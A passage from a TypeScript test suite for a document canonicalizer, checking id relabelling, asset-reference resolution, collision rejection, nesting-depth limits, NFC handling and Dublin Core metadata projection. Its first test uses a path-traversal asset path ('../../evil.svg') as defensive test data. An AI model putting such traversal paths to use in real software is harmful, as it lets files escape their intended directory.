  const index = JSON.stringify({ assets: [{ id: 'e', path: '../../evil.svg', hash }] });
  const assetMap = buildAssetMap(JSON.parse(manifest), { images: index });
  assert.deepEqual([...assetMap.keys()], ['evil.svg'], 'the registered key escapes the assets/ tree');

  // Two spellings of the SAME registered asset: the bare key, and a path that normalizes to it.
  const content = twoLinkedTexts('evil.svg', 'assets/images/../../evil.svg');
  assert.doesNotThrow(
    () => computeDocumentId({ manifest, content: JSON.stringify(content), dublinCore: '{}', assetIndexes: { images: index } }, 'sha256'),
    'the canonicalizer resolves both spellings and merges the nodes',
  );
  assert.deepEqual(collectDefinedIds(content, { rawInput: true, assetMap }).duplicates, [], 'the raw walk must agree');
});

test('collectDefinedIds: an unresolvable asset href must not throw out of the walk', () => {
  // `resolveAssetRef` THROWS for an `assets/`-rooted href the map does not carry. If
  // mergeKeyOf called it, that throw would propagate through walkContentNodes into the
  // conformance resolver's catch-all and silently discard EVERY finding of that pass — the
  // id collision included. So one dangling asset href would switch off an INTEGRITY-ERROR.
  const assetMap = buildAssetMap(JSON.parse(ASSET_MANIFEST), { images: ASSET_INDEX });
  const content = twoLinkedTexts('assets/images/gone.png', 'assets/images/also-gone.png');
  assert.throws(
    () => computeDocumentId({ manifest: ASSET_MANIFEST, content: JSON.stringify(content), dublinCore: '{}', assetIndexes: { images: ASSET_INDEX } }, 'sha256'),
    /resolves to no registered asset/,
    'the canonicalizer rejects the document outright',
  );
  // The walk must still complete. Both hrefs fall back to the same placeholder, so the nodes
  // merge and no duplicate is reported — the conservative direction: a possibly missed
  // collision on a document that is unloadable anyway, never a FALSE collision.
  let ids: ReturnType<typeof collectDefinedIds> | undefined;
  assert.doesNotThrow(() => {
    ids = collectDefinedIds(content, { rawInput: true, assetMap });
  }, 'the raw walk must not inherit resolveAssetRef throw');
  assert.deepEqual(ids?.duplicates, []);
});

test('collectDefinedIds: with no asset map, packaged hrefs keep the conservative placeholder', () => {
  // A caller that cannot resolve assets (an absent or malformed index) gets the pre-3b-2
  // behaviour: every packaged-asset href keys alike, so the nodes OVER-merge. That risks a
  // missed collision rather than manufacturing a false one, which would be an
  // INTEGRITY-ERROR on a document the canonicalizer accepts.
  const content = twoLinkedTexts('assets/images/a.png', 'assets/images/b.png');
  assert.deepEqual(collectDefinedIds(content, { rawInput: true }).duplicates, [], 'no map -> over-merge');
  const assetMap = buildAssetMap(JSON.parse(ASSET_MANIFEST), { images: ASSET_INDEX });
  assert.deepEqual(collectDefinedIds(content, { rawInput: true, assetMap }).duplicates, ['x'], 'with the map -> the real collision');
});

test('collectDefinedIds: assetMap changes nothing on the non-rawInput path', () => {
  // The merge model exists only to mirror `canon` when walking RAW content. `alphaRenameIds`
  // walks canon's OUTPUT, where merging has already happened, so applying it there would
  // widen what computeDocumentId accepts. Pin that the option is inert without `rawInput`.
  const assetMap = buildAssetMap(JSON.parse(ASSET_MANIFEST), { images: ASSET_INDEX });
  const content = twoLinkedTexts('assets/images/a.png', 'assets/images/alias.png');
  assert.deepEqual(collectDefinedIds(content).ids, collectDefinedIds(content, { assetMap }).ids);
  assert.deepEqual(collectDefinedIds(content).duplicates, collectDefinedIds(content, { assetMap }).duplicates);
});

test('collectDefinedIds: a non-array `marks` is not a mark collection', () => {
  // rewriteIds dispatches on `key === 'marks' && Array.isArray(...)`, so to the
  // canonicalizer an object-valued `marks` is an ordinary field and the typed object
  // inside it is a BLOCK — it relabels the id through the block branch. The walk must
  // classify it the same way, or a consumer keying off the walk would treat the object as
  // a mark: a `link` there would be resolved as a mark href the canonicalizer never
  // rewrites, reporting a dangling reference that does not exist.
  const withAnchor = { blocks: [{ type: 'paragraph', id: 'p', marks: { type: 'anchor', id: 'a' }, children: [] }] };
  assert.deepEqual(collectDefinedIds(withAnchor, { rawInput: true }).ids, ['p', 'a']);
  assert.equal((canonContent({ content: withAnchor }) as any).blocks[0].marks.id, 'b1', 'relabelled through the block branch');
  // The dispatch itself, not just its id side effect: a consumer that keys reference
  // resolution off `inMarks` would otherwise treat this object as a mark.
  let anchorCtx: { inMarks: boolean } | undefined;
  walkContentNodes(withAnchor, (node, ctx) => {
    if (node.type === 'anchor') anchorCtx = ctx;
  }, { rawInput: true });
  assert.equal(anchorCtx?.inMarks, false, 'an object-valued `marks` must not be walked as a mark collection');

  // The reference side of the same dispatch: a `link` under an object-valued `marks` is
  // not a mark href, so it is left verbatim rather than rewritten as a Content Anchor.
  const withLink = { blocks: [{ type: 'paragraph', id: 'p', marks: { type: 'link', href: '#p' }, children: [] }] };
  assert.equal((canonContent({ content: withLink }) as any).blocks[0].marks.href, '#p', 'not rewritten');
});

test('relabel: the duplicate-id error names the FIRST collision reached', () => {
  // collectDefinedIds now completes its traversal and throws on duplicates[0]; the old
  // in-place pass aborted at the first repeat. Identical only if duplicates[0] is that
  // same id, and the message text is what a caller matching on it depends on.
  assert.throws(
    () =>
      canonContent({ content: { version: '0.1', blocks: [
        { type: 'paragraph', id: 'first', children: [] },
        { type: 'paragraph', id: 'second', children: [] },
        { type: 'paragraph', id: 'first', children: [] },
        { type: 'paragraph', id: 'second', children: [] },
      ] } }),
    (err: unknown) =>
      err instanceof CanonicalizationError &&
      err.message === 'duplicate id "first" in the shared identifier namespace',
  );
});

test('collectDefinedIds: rawInput erases exactly what canon erases', () => {
  // Raw stored content, never passed through canon. Three properties at once:
  // identical anchor marks on a TEXT node dedup to one id (canon would have);
  // the same marks on a non-text node do NOT (canon would not); and an id inside a
  // crdt payload is outside the namespace, since canon deletes crdt before relabeling.
  const rawText = collectDefinedIds(
    { blocks: [{ type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'anchor', id: 'a' }, { type: 'anchor', id: 'a' }] }] }] },
    { rawInput: true },
  );
  assert.deepEqual(rawText.ids, ['a']);
  assert.deepEqual(rawText.duplicates, []);

  const rawNonText = collectDefinedIds(
    { blocks: [{ type: 'paragraph', marks: [{ type: 'anchor', id: 'a' }, { type: 'anchor', id: 'a' }], children: [] }] },
    { rawInput: true },
  );
  assert.deepEqual(rawNonText.duplicates, ['a']);

  const rawCrdt = collectDefinedIds(
    { blocks: [{ type: 'paragraph', id: 'p', crdt: { blocks: [{ type: 'paragraph', id: 'p' }] }, children: [] }] },
    { rawInput: true },
  );
  assert.deepEqual(rawCrdt.ids, ['p']);
  assert.deepEqual(rawCrdt.duplicates, []); // the crdt-interior 'p' is not in the namespace

  // Without rawInput the traversal is unfiltered — the collection alphaRenameIds does.
  const unfiltered = collectDefinedIds({ blocks: [{ type: 'paragraph', id: 'p', crdt: { blocks: [{ type: 'paragraph', id: 'p' }] }, children: [] }] });
  assert.deepEqual(unfiltered.duplicates, ['p']);
});

test('relabel: a sub-block id colliding with a block id is a duplicate error', () => {
  // An equation-line id equal to a paragraph block id used to canonicalize
  // silently, redirecting the #eq-x reference to the block and baking that into
  // the document id. The two ids now share one namespace, so the collision is a
  // canonicalization error rather than a silent redirect.
  assert.throws(
    () =>
      canonContent({
        content: { version: '0.1', blocks: [
          { type: 'paragraph', id: 'eq-x', children: [] },
          { type: 'academic:equation-group', id: 'eqg', lines: [{ value: 'a=b', id: 'eq-x' }] },
          { type: 'paragraph', children: [{ type: 'text', value: 's', marks: [{ type: 'academic:equation-ref', target: '#eq-x' }] }] },
        ] },
      }),
    CanonicalizationError,
  );
});

test('purity: two documents differing only in sub-block id labels get the same id', () => {
  // Block-id purity extends to the sub-block namespace: relabeling an equation
  // line or subfigure id (and the references to it) must not change identity.
  const mk = (line: string, sub: string) =>
    makeParts({
      content: {
        version: '0.1',
        blocks: [
          { type: 'figure', id: 'fig', subfigures: [{ id: sub, label: 'a', children: [] }] },
          { type: 'academic:equation-group', id: 'eqg', lines: [{ value: 'a=b', id: line }] },
          { type: 'paragraph', children: [{ type: 'text', value: 's', marks: [{ type: 'academic:equation-ref', target: `#${line}` }] }] },
        ],
      },
    });
  assert.equal(computeDocumentId(mk('eq-exp', 'sub-a'), 'sha256'), computeDocumentId(mk('eq-99', 'sub-z'), 'sha256'));
});

test('purity: two documents differing only in id labels get the same document id', () => {
  const mk = (a: string, b: string) =>
    makeParts({
      content: {
        version: '0.1',
        blocks: [
          { type: 'heading', id: a, level: 1, children: [{ type: 'text', value: 'Title' }] },
          { type: 'paragraph', id: b, children: [{ type: 'text', value: 'above', marks: [{ type: 'link', href: `#${a}` }] }] },
        ],
      },
    });
  assert.equal(computeDocumentId(mk('intro', 'body'), 'sha256'), computeDocumentId(mk('alpha', 'beta'), 'sha256'));
});

test('purity: relabeling does NOT collapse documents that differ in reference structure', () => {
  const mk = (target: string) =>
    makeParts({
      content: {
        version: '0.1',
        blocks: [
          { type: 'heading', id: 'h1', level: 1, children: [{ type: 'text', value: 'A' }] },
          { type: 'heading', id: 'h2', level: 1, children: [{ type: 'text', value: 'B' }] },
          { type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: `#${target}` }] }] },
        ],
      },
    });
  assert.notEqual(computeDocumentId(mk('h1'), 'sha256'), computeDocumentId(mk('h2'), 'sha256'));
});

test('purity: an unresolved #bN reference is rejected (cannot alias a generated canonical name)', () => {
  // Without this guard a dangling "#b0" would canonicalize byte-identically to a
  // link that genuinely resolved to the relabeled block — a second-preimage collision.
  assert.throws(
    () =>
      canonContent({
        content: {
          version: '0.1',
          blocks: [{ type: 'paragraph', id: 'real', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#b0' }] }] }],
        },
      }),
    CanonicalizationError,
  );
  // A dangling ref not of the generated shape (`#b` with no digits) is still verbatim.
  const href = canonContent({
    content: { version: '0.1', blocks: [{ type: 'paragraph', id: 'p', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#b' }] }] }] },
  }).blocks[0].children[0].marks[0].href;
  assert.equal(href, '#b');
});

test('purity: a text-node id is content-significant — differing text-node ids yield different document ids', () => {
  const mk = (id: string) =>
    makeParts({
      content: {
        version: '0.1',
        blocks: [
          {
            type: 'paragraph',
            children: [
              { type: 'text', value: 'Hello ' },
              { type: 'text', value: 'world', id }, // id makes this a merge boundary AND is preserved verbatim
              { type: 'text', value: '!' },
            ],
          },
        ],
      },
    });
  // Unlike a BLOCK id (a normalized label), a text-node id is outside the
  // relabeled namespace (§4.3.1 items 4-5) and preserved verbatim, so it is part
  // of the content identity: two documents differing only in it are distinct.
  assert.notEqual(computeDocumentId(mk('w'), 'sha256'), computeDocumentId(mk('other'), 'sha256'));
});

test('resource bounds: content nested past MAX_CANONICALIZATION_DEPTH throws a typed error, not a RangeError', () => {
  const parts = makeParts({ content: nestArrays(MAX_CANONICALIZATION_DEPTH + 1) });
  // Must be the module's typed error (a verifier catching only this must not crash),
  // never an untyped RangeError from a native stack overflow.
  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
  try {
    computeDocumentId(parts, 'sha256');
  } catch (err) {
    assert.ok(!(err instanceof RangeError), 'must not surface an untyped RangeError');
    assert.match((err as Error).message, /nesting exceeds the maximum depth/);
  }
});

test('resource bounds: content nested exactly to MAX_CANONICALIZATION_DEPTH still canonicalizes', () => {
  const parts = makeParts({ content: nestArrays(MAX_CANONICALIZATION_DEPTH) });
  const id = computeDocumentId(parts, 'sha256');
  assert.match(id, /^sha256:[a-f0-9]{64}$/);
});

test('resource bounds: deeply nested Dublin Core metadata throws a typed error, not a RangeError', () => {
  // projectMetadata copies term arrays by reference, so a deep Dublin Core term
  // reaches validateStoredByteInvariants/jcsOf verbatim — the metadata walk path
  // must be guarded too, not just the content path.
  const parts = makeParts({
    content: { version: '0.1', blocks: [] },
    dublinCore: { version: '1.1', terms: { title: 'T', creator: nestArrays(MAX_CANONICALIZATION_DEPTH + 1) } },
  });
  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
  try {
    computeDocumentId(parts, 'sha256');
  } catch (err) {
    assert.ok(!(err instanceof RangeError), 'must not surface an untyped RangeError');
  }
});

test('block-level NFC: a combining sequence split across text-node boundaries is rejected', () => {
  // Two text nodes with different marks are not merged; each value is individually
  // NFC ('cafe' and a lone U+0301), but the concatenation 'café' is NFD.
  const split = makeParts({
    content: {
      version: '0.1',
      blocks: [{ type: 'paragraph', children: [
        { type: 'text', value: 'cafe', marks: ['bold'] },
        { type: 'text', value: '́', marks: ['italic'] },
      ] }],
    },
  });
  assert.throws(() => computeDocumentId(split, 'sha256'), CanonicalizationError);
  try {
    computeDocumentId(split, 'sha256');
  } catch (err) {
    assert.match((err as Error).message, /combining sequence is split|not in NFC/);
  }
});

test('block-level NFC: an NFC split across text-node boundaries still canonicalizes', () => {
  // 'caf' + precomposed 'é' — the split is NFC, so it is accepted (only a split
  // that BREAKS NFC is rejected).
  const nfcSplit = makeParts({
    content: {
      version: '0.1',
      blocks: [{ type: 'paragraph', children: [
        { type: 'text', value: 'caf', marks: ['bold'] },
        { type: 'text', value: 'é', marks: ['italic'] },
      ] }],
    },
  });
  assert.match(computeDocumentId(nfcSplit, 'sha256'), /^sha256:[a-f0-9]{64}$/);
});

test('metadata projection: empty array elements are dropped (id is the same with or without empties)', () => {
  const withEmpties = makeParts({
    content: { version: '0.1', blocks: [] },
    dublinCore: { version: '1.1', terms: { title: 'T', creator: ['Alice', '', 'Bob'], subject: ['', 'Fin'] } },
  });
  const without = makeParts({
    content: { version: '0.1', blocks: [] },
    dublinCore: { version: '1.1', terms: { title: 'T', creator: ['Alice', 'Bob'], subject: ['Fin'] } },
  });
  assert.equal(computeDocumentId(withEmpties, 'sha256'), computeDocumentId(without, 'sha256'));
});

test('metadata projection: a malformed Dublin Core term is rejected, not silently dropped', () => {
  // A non-string title would previously drop silently, colliding with an absent title.
  const parts = makeParts({
    content: { version: '0.1', blocks: [] },
    dublinCore: { version: '1.1', terms: { title: 123, creator: 'C' } },
  });
  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
});

test('metadata projection: a non-string array element in a term is rejected', () => {
  const parts = makeParts({
    content: { version: '0.1', blocks: [] },
    dublinCore: { version: '1.1', terms: { title: 'T', creator: ['A', 42] } },
  });
  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
});

test('numbers: an integer beyond the 2^53-1 safe range is rejected as a canonicalization error', () => {
  const parts = makeParts({ content: { version: '0.1', blocks: [], bignum: 9007199254740993 } });
  assert.throws(() => computeDocumentId(parts, 'sha256'), CanonicalizationError);
});

console.log(`\n${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
